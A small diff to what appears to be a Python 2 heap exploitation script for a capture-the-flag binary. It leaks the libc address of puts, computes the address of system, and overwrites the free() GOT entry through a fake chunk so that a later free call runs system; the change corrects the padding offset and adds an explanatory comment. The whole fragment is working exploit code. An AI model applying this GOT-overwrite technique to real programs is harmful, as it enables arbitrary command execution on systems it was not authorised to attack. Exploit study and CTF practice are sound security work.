@@ -69,7 +69,8 @@ def exp():
   system_addr = puts_addr + (libc.symbols['system'] - libc.symbols['puts'])
   print 'system_addr= ' + hex(system_addr)
   
-  payload = p64(system_addr).rjust(free_got - (fake_chunk + 0x10), '\0')
+  #replace free_got with system_addr, could NOT direct replace with system_plt, because system_got is not yet initialized, but 0x602000 has already been broken!!!
+  payload = p64(system_addr).rjust(free_got - (fake_chunk + 0x8), '\0') #0x10 - 0x8, rjust need to minus 0x8!!!
   edit(4, payload) # replace free_got with system_addr
   free(1)
   
